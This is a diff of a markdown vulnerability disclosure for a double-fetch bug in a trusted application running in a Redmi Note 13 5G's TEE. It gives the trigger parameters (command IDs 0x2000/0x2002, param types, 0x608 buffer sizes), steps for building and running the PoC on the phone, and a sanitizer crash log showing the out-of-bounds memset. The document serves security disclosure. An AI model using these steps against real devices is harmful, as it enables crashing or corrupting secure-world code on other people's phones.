@@ -12,7 +12,9 @@ The sha1 of the TA is `0e0d57e8ffef6746125a37e888d214fb3b7421f9`
 
 `TA_InvokeCommandEntryPoint` is the attack entry point, which can be directly triggered by an attacker acting as a TEE client through `TEEC_InvokeCommand`.
 
-This vulnerability firstly requires setting the second argument of `TA_InvokeCommandEntryPoint` (`comm_id`) to **0x2000** or **0x2002**, while controlling `uint32_t param_types` to `TEEC_MEMREF_*` (i.e., `(TEEC_MEMREF_TEMP_INPUT) | ((TEEC_MEMREF_TEMP_OUTPUT) << 4)=0x65`). Then `TEE_Param *params` of `TA_InvokeCommandEntryPoint` are transmitted through shared memory between the normal world and the TEE environment.
+The key reason for this vulnerability is the double-fetch problem to the allocated memory between normal world and security world. An attacker can easily manipulate this shared memory from normal world to influence the behavior of the TA in secure world.
+
+Specifically, this vulnerability firstly requires setting the second argument of `TA_InvokeCommandEntryPoint` (`comm_id`) to **0x2000** or **0x2002**, while controlling `uint32_t param_types` to `TEEC_MEMREF_*` (i.e., `(TEEC_MEMREF_TEMP_INPUT) | ((TEEC_MEMREF_TEMP_OUTPUT) << 4)=0x65`). Then `TEE_Param *params` of `TA_InvokeCommandEntryPoint` are transmitted through shared memory between the normal world and the TEE environment.
 
 
 ```C
@@ -52,7 +54,7 @@ This vulnerability firstly requires setting the second argument of `TA_InvokeCom
 ```
 
 Note that we need to pass the checks at line 10 and line 15. Therefore, we create two buffers for `params`, named `mem_area1` (`params[0].buffer`) and `mem_area2` (`params[1].buffer`), as shown in the code above, and set the size of both buffers to 0x608. 
-Specifically, we set `*(int *)(params + 1)` (i.e., `params[0].size`) and `*(int *)(params + 3)` (i.e., `params[1].size`) to 0x608.
+In particular, we set `*(int *)(params + 1)` (i.e., `params[0].size`) and `*(int *)(params + 3)` (i.e., `params[1].size`) to 0x608.
 
 
 ```C
@@ -104,83 +106,8 @@ Using `comm_id = 0x2000` as an example, the second fetch occurs at line 18 in `F
 
 In conclusion, an attacker in the normal world can exploit a double-fetch vulnerability to bypass parameter validation. By modifying the parameters between the two fetches, the attacker can further tamper with the size variable used in a `memset()` call, eventually causing an out-of-bounds write on the Trusted Application (TA) running inside the TEE.
 
-## Screenshots for Validity
 
-
-```C
-[=]     printf: [VSIMApp:INFO][TA_CreateEntryPoint:16]==func enter==
-[=]     printf: [VSIMApp:INFO][TA_CreateEntryPoint:18]==func exit==
-[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:34]==func enter==
-[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:36]==func exit==
-[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:53]==func enter==
-[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:54]cmd 00002000
-[=]     TEE_OpenPersistentObject:
-[=]             objectID b'enroll_key'
-[=]             file name: ./emulate/files/2147483648/enroll_key
-[=]             ret 0xffff0008
-[=]     printf: [VSIMApp:ERROR][load_rsa_from_file:204]key enroll_key does not exists or empty
-
-[=]     memset 0x100000 bytes of 0x0 fill to 0xbbbbf008
-[x]     =================[lr: 0x555555574d54] [memset] memory corruption detected!!
-[x]     CPU Context:
-[x]     x0      : 0xbbbbf008
-[x]     x1      : 0x0
-[x]     x2      : 0x100000
-[x]     x3      : 0x555555556f66
-[x]     x4      : 0xcc
-[x]     x5      : 0x5555555565fc
-[x]     x6      : 0x400
-[x]     x7      : 0x0
-[x]     x8      : 0x0
-[x]     x9      : 0x0
-[x]     x10     : 0x0
-[x]     x11     : 0x0
-[x]     x12     : 0x0
-[x]     x13     : 0x0
-[x]     x14     : 0x0
-[x]     x15     : 0x0
-[x]     x16     : 0x5555555b2458
-[x]     x17     : 0x99999018
-[x]     x18     : 0x0
-[x]     x19     : 0xbbbbf000
-[x]     x20     : 0xf0ffe4
-[x]     x21     : 0xbbbbf008
-[x]     x22     : 0xeee008
-[x]     x23     : 0xf0fff0
-[x]     x24     : 0xcacacacacacacaca
-[x]     x25     : 0x0
-[x]     x26     : 0x0
-[x]     x27     : 0x0
-[x]     x28     : 0x0
-[x]     x29     : 0x8000002dddc0
-[x]     x30     : 0x555555574d54
-[x]     sp      : 0x8000002ddd90
-[x]     pc      : 0xdeadbeef
-[x]     lr      : 0x555555574d54
-[x]     PC = 0x00000000deadbeef (unreachable)
-
-[x]     Memory map:
-[x]     Start            End              Perm    Label                                    Image
-[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls
-[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack
-[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
-[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
-[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
-[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
-[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_0
-[x]     000000bbbbf000 - 000000bbbc0000   rw-     shared_memory_1
-[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
-[x]     00555555554000 - 00555555573000   r--     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
-[x]     00555555573000 - 005555555af000   r-x     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
-[x]     005555555af000 - 005555555be000   rw-     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
-[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffffffde000 - 008000002de000   rwx     [stack]
-```
-
-
-### Source code of the POC
+## Source code of the POC
 
 
 ```C
@@ -376,6 +303,116 @@ For reference, the dependent files for the PoC are attached here.
 - `tee.h`: Open-sourced in the OPTEE repo
 - `repro.h`: Contains basic utilities specific to this PoC, primarily handling parameter initialization, TEE Client API invocation, and character-related operations.
 - `libteecli.so`: Can be found at the device path ./vendor/lib64/libteecli.so.
+- `Makefile`: Helps to generate and push specific poc binary to the phone
 
 
-### Vulnerability Reproduction
+## Vulnerability Reproduction
+
+We reproduced the poc on the Redmi Note 13 5G (OS Version: 1.0.18.0.UNQEUXM)
+
+1. Compile the poc:
+
+```bash
+ANDROID_NDK=$(path to android ndk) make phone
+```
+
+Upload the generate `./poc` executable to `/vendor/bin`. (On the phone we used a magisk plugin for this, but on a developer phone it should be possible to make `/vendor` writable)
+
+2. Then run the poc: 
+   
+```
+/vendor/bin/poc
+```
+
+The poc triggers the out-of-bounds (OOB) write and causes the TA to crash.
+The poc prints the return code and error origin which will be, indicating the TA crashed.
+
+```
+TEEC_Result: ffff3024  // TEE_ERROR_TARGET_DEAD
+origin: err_origin: 3 // TEEC_ORIGIN_TEE
+```
+
+
+
+## Screenshots for Validity
+
+![screenshots](pics/image.png)
+
+
+More detailed can be seen in our customized emulation mode with address sanitizer.
+
+```C
+[=]     printf: [VSIMApp:INFO][TA_CreateEntryPoint:16]==func enter==
+[=]     printf: [VSIMApp:INFO][TA_CreateEntryPoint:18]==func exit==
+[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:34]==func enter==
+[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:36]==func exit==
+[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:53]==func enter==
+[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:54]cmd 00002000
+[=]     TEE_OpenPersistentObject:
+[=]             objectID b'enroll_key'
+[=]             file name: ./emulate/files/2147483648/enroll_key
+[=]             ret 0xffff0008
+[=]     printf: [VSIMApp:ERROR][load_rsa_from_file:204]key enroll_key does not exists or empty
+
+[=]     memset 0x100000 bytes of 0x0 fill to 0xbbbbf008
+[x]     =================[lr: 0x555555574d54] [memset] memory corruption detected!!
+[x]     CPU Context:
+[x]     x0      : 0xbbbbf008
+[x]     x1      : 0x0
+[x]     x2      : 0x100000
+[x]     x3      : 0x555555556f66
+[x]     x4      : 0xcc
+[x]     x5      : 0x5555555565fc
+[x]     x6      : 0x400
+[x]     x7      : 0x0
+[x]     x8      : 0x0
+[x]     x9      : 0x0
+[x]     x10     : 0x0
+[x]     x11     : 0x0
+[x]     x12     : 0x0
+[x]     x13     : 0x0
+[x]     x14     : 0x0
+[x]     x15     : 0x0
+[x]     x16     : 0x5555555b2458
+[x]     x17     : 0x99999018
+[x]     x18     : 0x0
+[x]     x19     : 0xbbbbf000
+[x]     x20     : 0xf0ffe4
+[x]     x21     : 0xbbbbf008
+[x]     x22     : 0xeee008
+[x]     x23     : 0xf0fff0
+[x]     x24     : 0xcacacacacacacaca
+[x]     x25     : 0x0
+[x]     x26     : 0x0
+[x]     x27     : 0x0
+[x]     x28     : 0x0
+[x]     x29     : 0x8000002dddc0
+[x]     x30     : 0x555555574d54
+[x]     sp      : 0x8000002ddd90
+[x]     pc      : 0xdeadbeef
+[x]     lr      : 0x555555574d54
+[x]     PC = 0x00000000deadbeef (unreachable)
+
+[x]     Memory map:
+[x]     Start            End              Perm    Label                                    Image
+[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls
+[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack
+[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
+[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
+[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
+[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
+[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_0
+[x]     000000bbbbf000 - 000000bbbc0000   rw-     shared_memory_1
+[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
+[x]     00555555554000 - 00555555573000   r--     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
+[x]     00555555573000 - 005555555af000   r-x     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
+[x]     005555555af000 - 005555555be000   rw-     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
+[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffffffde000 - 008000002de000   rwx     [stack]
+```
+
+### Impact 
+
+An attacker **running in the normal world** (either as root or in the context of a process able to communicate with the tee drivers like `/dev/tee0` or `/dev/teepriv0`) can trigger this bug. 
